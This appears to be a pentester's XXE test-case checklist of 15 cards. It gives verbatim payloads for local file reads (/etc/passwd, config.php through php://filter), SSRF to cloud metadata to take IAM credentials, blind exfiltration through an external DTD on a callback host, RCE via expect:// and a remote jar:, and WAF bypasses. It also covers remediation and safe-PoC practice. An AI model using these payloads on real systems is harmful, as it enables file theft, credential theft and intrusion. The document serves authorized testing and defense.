# XXE — Checklist

Expert per-attack **test-case matrix** for XXE — in testing order, impact-first. Each card: where to inject, steps, expected result, verbatim payload, impact, severity, CVSS, tools, references.

*15 test cases. Source: expert checklist matrix (12/14-col). Payloads shown verbatim in code blocks.*

---

## XXE-001 — Enumerate XML sinks &amp; XML-backed uploads
**Test Category:** Recon &amp; Sinks · **Severity:** Info · **CVSS:** 0.0 (N/A)

**Where to Test / Injection Point:** Raw XML/SOAP bodies, REST/JSON (content-type switch), uploads: SVG/DOCX/XLSX/PPTX/ODT/PDF/RSS/GPX/KML/plist/SAML, features: sitemap import, /xmlrpc.php, SSO, SVG-&gt;PNG, report generators

**Test Steps:** 1. Find raw XML/SOAP bodies (application/xml, text/xml, application/soap+xml).<br>2. Re-test JSON endpoints with an XML content-type (switch trick).<br>3. Treat XML-backed uploads as sinks: SVG, OOXML (DOCX/XLSX/PPTX), ODT, PDF, RSS/Atom, GPX/KML, plist, SAML metadata.<br>4. Grep source/JS for XML parser calls + DOCTYPE handling.

**Expected Result:** An inventory of every XML parse point and XML-backed upload.

**Payload Example:**

```
Content-Type: application/xml ; upload avatar.svg ; resume.docx ; POST /xmlrpc.php
```

**Impact:** Missing an XML-backed upload (SVG/DOCX) or a content-type switch means missing the XXE.

**Tools:** Burp Suite Pro, source grep

**References:** CWE-611; OWASP Testing Guide: Testing for XXE (WSTG-INPV-07)

---

## XXE-002 — Detect parsing + classify observability (safe)
**Test Category:** Detect (safe) · **Severity:** Info · **CVSS:** 0.0 (N/A)

**Where to Test / Injection Point:** Each XML sink

**Test Steps:** 1. Confirm XML is parsed: send malformed XML -&gt; parse error vs normal.<br>2. Internal-entity test: &lt;!ENTITY test "x8bit-marker"&gt; -&gt; reflected = in-band; parsed-not-reflected = blind; DOCTYPE error = XInclude/hardened.<br>3. Classify: in-band / blind-OOB / error-based / fully-blind.

**Expected Result:** The sink is confirmed to parse XML and its observability channel is known.

**Payload Example:**

```
<!DOCTYPE r [ <!ENTITY test "x8bit-marker"> ]><r>&test;</r>
```

**Impact:** Classification picks the right technique and avoids firing risky payloads blindly.

**Tools:** Burp Repeater

**References:** CWE-611; PortSwigger Web Security Academy: XML external entity (XXE) injection

---

## XXE-003 — In-band file read
**Test Category:** File Read (in-band) · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:L)

**Where to Test / Injection Point:** Sinks that reflect an entity's value in the response

**Test Steps:** 1. Benign first: file:///etc/hostname in &lt;!ENTITY xxe SYSTEM ...&gt; and reference &amp;xxe; in a reflected node.<br>2. Escalate to sensitive: /etc/passwd, .env, web.config, /proc/self/environ.<br>3. Windows: file:///c:/windows/win.ini, /c:/inetpub/wwwroot/web.config.

**Expected Result:** The target file's contents appear in the response.

**Payload Example:**

```
<!DOCTYPE r [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><r>&xxe;</r>
```

**Impact:** Arbitrary local file read -&gt; secrets/config/source disclosure - High/Critical.

**Tools:** Burp Repeater

**References:** CWE-611; PortSwigger Web Security Academy: XML external entity (XXE) injection

---

## XXE-004 — Read source with php://filter base64
**Test Category:** File Read (in-band) · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:L)

**Where to Test / Injection Point:** PHP apps; files containing &lt; &amp; (source code)

**Test Steps:** 1. Wrap the target in php://filter to base64-encode it (survives XML special chars):<br> resource=/var/www/html/config.php.<br>2. Base64-decode the reflected blob -&gt; raw source.<br>3. Target wp-config.php, database.yml, index.php.

**Expected Result:** Base64-decoding the reflected value yields raw source code.

**Payload Example:**

```
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/config.php">
```

**Impact:** Source + DB creds/API keys disclosure -&gt; chains to fuller compromise. High/Critical.

**Tools:** Burp Repeater, CyberChef

**References:** CWE-611; HackTricks: XXE

---

## XXE-005 — XXE -&gt; SSRF -&gt; cloud metadata (IAM creds)
**Test Category:** SSRF · **Severity:** Critical · **CVSS:** 9.9 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:L)

**Where to Test / Injection Point:** http:// entity fetch from the parser

**Test Steps:** 1. Point an entity at an internal/attacker URL: http://internal-svc:PORT/.<br>2. Cloud metadata: http://169.254.169.254/latest/meta-data/iam/security-credentials/ (AWS), metadata.google.internal (GCP), Azure IMDS (headers often not settable via XXE).<br>3. Prove IAM creds, then STOP (hand to SSRF kit).

**Expected Result:** The parser fetches your internal/metadata URL; IAM creds are returned.

**Payload Example:**

```
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
```

**Impact:** SSRF -&gt; cloud IAM credential theft = Critical (cloud account takeover).

**Tools:** Burp Collaborator, SSRFmap

**References:** CWE-611; CWE-918; PortSwigger Web Security Academy: XML external entity (XXE) injection

---

## XXE-006 — Blind OOB exfil (parameter entity + external DTD)
**Test Category:** Blind — OOB · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:L)

**Where to Test / Injection Point:** Parsed-but-not-reflected sinks with HTTP/FTP/DNS egress

**Test Steps:** 1. Submit: &lt;!DOCTYPE r [ &lt;!ENTITY % ext SYSTEM "http://$COLLAB/evil.dtd"&gt; %ext; ]&gt;.<br>2. evil.dtd defines %file (file:///etc/hostname), %eval, %exfil -&gt; GET http://$COLLAB/log?x=%file;.<br>3. Benign file first; php://filter base64 for multi-line/source. HTTP egress dead -&gt; FTP-OOB (Java) or DNS-only confirm.

**Expected Result:** The file's contents arrive at your OOB server's log (?x=&lt;contents&gt;).

**Payload Example:**

```
<!DOCTYPE r [ <!ENTITY % ext SYSTEM "http://$COLLAB/evil.dtd"> %ext; ]><r>trigger</r>
```

**Impact:** Blind file exfiltration -&gt; secrets disclosure without any reflection. High/Critical.

**Tools:** poc/oob_server.py, interactsh, Burp Collaborator

**References:** CWE-611; PortSwigger Web Security Academy: XML external entity (XXE) injection

---

## XXE-007 — Error-based exfil + local DTD reuse (no outbound)
**Test Category:** Blind — Error-based · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:L)

**Where to Test / Injection Point:** Egress-dead sinks with verbose parser errors

**Test Steps:** 1. External DTD: %eval defines %err SYSTEM 'file:///nonexistent/%file;' -&gt; contents appear in the 'failed to open' error.<br>2. Fully local (no attacker server): reuse an on-box DTD (e.g. yelp docbookx.dtd) and override its param entity.<br>3. Enumerate a present DTD first.

**Expected Result:** File contents appear inside a parser error message.

**Payload Example:**

```
%eval "<!ENTITY % err SYSTEM 'file:///nonexistent/%file;'>" ; local DTD: file:///usr/share/yelp/dtd/docbookx.dtd
```

**Impact:** File read even with no outbound egress - defeats the common 'no egress' assumption. High.

**Tools:** Burp Repeater

**References:** CWE-611; HackTricks: XXE

---

## XXE-008 — XInclude (no DOCTYPE control)
**Test Category:** XInclude · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:L)

**Where to Test / Injection Point:** Sinks where you only own a sub-node (DOCTYPE can't be added)

**Test Steps:** 1. Inject an xi:include element the server embeds into its own XML:<br> &lt;xi:include parse="text" href="file:///etc/passwd"/&gt; with xmlns:xi.<br>2. Source via php://filter; SSRF via href=http://169.254.169.254/.<br>3. Works when full-document DOCTYPE injection is blocked.

**Expected Result:** The included file/URL content is embedded in the response.

**Payload Example:**

```
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
```

**Impact:** File read / SSRF where classic XXE is blocked - High.

**Tools:** Burp Repeater

**References:** CWE-611; CWE-91; PortSwigger Web Security Academy: XML external entity (XXE) injection

---

## XXE-009 — SVG upload XXE (in-band + blind)
**Test Category:** Uploads · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:L)

**Where to Test / Injection Point:** Avatar/image upload, SVG-&gt;PNG/thumbnail render

**Test Steps:** 1. Upload an SVG with a DOCTYPE entity reading file:///etc/hostname into a &lt;text&gt; node (in-band via rendered output).<br>2. Blind variant: parameter entity -&gt; external evil.dtd for OOB exfil.<br>3. View the rendered/converted output for the leaked value.

**Expected Result:** The rendered SVG shows the file contents, or an OOB callback fires.

**Payload Example:**

```
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]><svg ...><text>&xxe;</text></svg>
```

**Impact:** File read / SSRF via image upload - a very common overlooked sink. High/Critical.

**Tools:** poc/make_svg_xxe.py, oxml_xxe

**References:** CWE-611; HackTricks: XXE

---

## XXE-010 — OOXML (DOCX/XLSX/PPTX) upload XXE
**Test Category:** Uploads · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:L)

**Where to Test / Injection Point:** Resume/import/preview features accepting Office files

**Test Steps:** 1. OOXML = zip of XML. Unzip, inject a DOCTYPE + blind-OOB into word/document.xml (or xl/workbook.xml), re-zip.<br>2. poc/make_ooxml_xxe.py doc.docx http://$COLLAB/evil.dtd builds it.<br>3. Upload to the resume/import/preview feature; watch OOB.

**Expected Result:** Processing the uploaded Office file triggers an OOB callback / file exfil.

**Payload Example:**

```
unzip doc.docx ; edit word/document.xml (add DOCTYPE + param-entity OOB) ; rezip -> evil.docx
```

**Impact:** File read / SSRF via document upload - High/Critical.

**Tools:** poc/make_ooxml_xxe.py, oxml_xxe

**References:** CWE-611; PayloadsAllTheThings/XXE Injection

---

## XXE-011 — Content-type switch (JSON API -&gt; XML)
**Test Category:** Content-Type Switch · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:L)

**Where to Test / Injection Point:** REST/JSON endpoints

**Test Steps:** 1. Resend a JSON request with Content-Type: application/xml and an XML body carrying a DOCTYPE entity.<br>2. Try text/xml and application/*+xml too.<br>3. Many JSON parsers fall through to an XXE-vulnerable XML parser.

**Expected Result:** The JSON endpoint parses your XML and processes the external entity.

**Payload Example:**

```
Content-Type: application/xml\n\n<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r>&xxe;</r>
```

**Impact:** Unlocks XXE on APIs that appear JSON-only - High/Critical.

**Tools:** Burp Repeater

**References:** CWE-611; PortSwigger Web Security Academy: XML external entity (XXE) injection

---

## XXE-012 — XXE -&gt; RCE (expect:// / jar:)
**Test Category:** RCE · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** PHP with expect ext; Java with jar: handler

**Test Steps:** 1. PHP expect: &lt;!ENTITY xxe SYSTEM "expect://id"&gt;.<br>2. Java jar: &lt;!ENTITY xxe SYSTEM "jar:http://$COLLAB/evil.jar!/x"&gt; (fetch+extract).<br>3. Prove with a benign command (id/whoami) and stop.

**Expected Result:** A benign command executes via the XXE-reachable protocol handler.

**Payload Example:**

```
<!ENTITY xxe SYSTEM "expect://id"> ; <!ENTITY xxe SYSTEM "jar:http://$COLLAB/evil.jar!/x">
```

**Impact:** XXE escalates to RCE - Critical (rare but maximum impact).

**Tools:** Burp, custom jar

**References:** CWE-611; CWE-78; HackTricks: XXE

---

## XXE-013 — WAF / filter bypasses
**Test Category:** Evade — WAF/Filter · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:L)

**Where to Test / Injection Point:** Sinks behind a signature WAF or entity/protocol blacklist

**Test Steps:** 1. DOCTYPE/ENTITY blocked -&gt; XInclude or content-type switch.<br>2. SYSTEM blocked -&gt; PUBLIC: &lt;!ENTITY xxe PUBLIC "-//x//x" "file:///etc/passwd"&gt;.<br>3. Byte-signature WAF -&gt; submit XML as UTF-16 (iconv -t UTF-16BE) or add a UTF-16/UTF-7 BOM.<br>4. Protocol blocked -&gt; swap file://&lt;-&gt;php://filter&lt;-&gt;http://&lt;-&gt;ftp://&lt;-&gt;jar:. Outbound blocked -&gt; error-based + local DTD.

**Expected Result:** The payload bypasses the filter and the entity resolves.

**Payload Example:**

```
<!ENTITY xxe PUBLIC "-//x//x" "file:///etc/passwd"> ; iconv -f UTF-8 -t UTF-16BE payload.xml
```

**Impact:** Restores XXE against WAFs/blacklists - proves partial fixes incomplete.

**Tools:** Burp, iconv

**References:** CWE-611; HackTricks: XXE

---

## XXE-014 — False-positive filter / auto-reject
**Test Category:** Validation &amp; Reporting · **Severity:** Info · **CVSS:** 0.0 (N/A)

**Where to Test / Injection Point:** Before reporting any candidate

**Test Steps:** 1. REJECT: an internal entity (&amp;test;) merely reflected (proves parsing, not external fetch); a parse error on &lt;!DOCTYPE with no confirmed fetch/OOB; 'it fetched my URL' (SSRF-only) with no metadata/creds/file; billion-laughs 'crash' on a scratch box (DoS, usually out of scope - never on prod).<br>2. Blind DNS-only hit = report as blind XXE (escalate for High), not full read.<br>3. REQUIRE: real file contents or creds.

**Expected Result:** Only candidates with real file contents / creds / metadata survive.

**Payload Example:**

```
reflected &test; = NOT external fetch ; DOCTYPE parse error alone = not a finding
```

**Impact:** Protects credibility; XXE is dense with 'internal entity reflected' false positives.

**Tools:** manual

**References:** CWE-611; PortSwigger Web Security Academy: XML external entity (XXE) injection

---

## XXE-015 — Client-facing impact &amp; SAFE-PoC package
**Test Category:** Validation &amp; Reporting · **Severity:** Info · **CVSS:** 0.0 (N/A)

**Where to Test / Injection Point:** Confirmed finding, pre-submission

**Test Steps:** 1. Lead with impact: file read of secrets / SSRF-&gt;cloud creds / RCE.<br>2. Provide the exact XML, the leaked benign-file contents (or OOB log line / metadata creds), and the sink.<br>3. Set CVSS 3.1 + CWE-611. Remediation: disable DTDs/external entities in the parser (defusedxml, libxml_disable_entity_loader, FEATURE_SECURE_PROCESSING, XMLConstants), disable XInclude, use least-privilege.<br>4. SAFE-PoC: benign file first, minimum reads, no prod DoS, delete uploads, tear down the OOB listener.

**Expected Result:** A reproducible, correctly-rated, safe PoC with clear remediation.

**Payload Example:**

```
PoC: XML + leaked /etc/hostname (or OOB log / IAM creds) + CVSS + CWE-611 + parser-hardening remediation.
```

**Impact:** Converts the read/SSRF into a defensible High/Critical report at the correct severity.

**Tools:** CVSS calculator, XXE_REPORT_TEMPLATE.md

**References:** CWE-611; FIRST CVSS v3.1; OWASP Testing Guide: Testing for XXE (WSTG-INPV-07)  |  TOP REFERENCES: PortSwigger Academy; Timothy Morgan XXE-OOB research; PayloadsAllTheThings; HackTricks; OWASP XXE Prevention

---
